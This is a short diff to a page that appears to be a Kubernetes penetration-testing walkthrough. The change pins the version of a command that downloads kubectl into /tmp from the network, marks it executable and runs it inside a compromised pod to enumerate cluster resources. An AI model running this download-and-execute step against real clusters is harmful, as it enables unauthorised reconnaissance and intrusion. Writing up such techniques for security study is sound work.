@@ -612,7 +612,7 @@
 </pre></div></p>
 <p>We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API. We can see that the Kubernetes version is modern and supported -- but there's still hope if the Kubernetes security configuration is sloppy. Let's check for that next:</p>
 <p><div class="codehilite"><pre><span></span><span class="go">export PATH=/tmp:$PATH</span>
-<span class="go">cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl; chmod 555 kubectl</span>
+<span class="go">cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.16.4/bin/linux/amd64/kubectl; chmod 555 kubectl</span>
 </pre></div>
 <div class="codehilite"><pre><span></span><span class="go">kubectl get all</span>
 </pre></div>
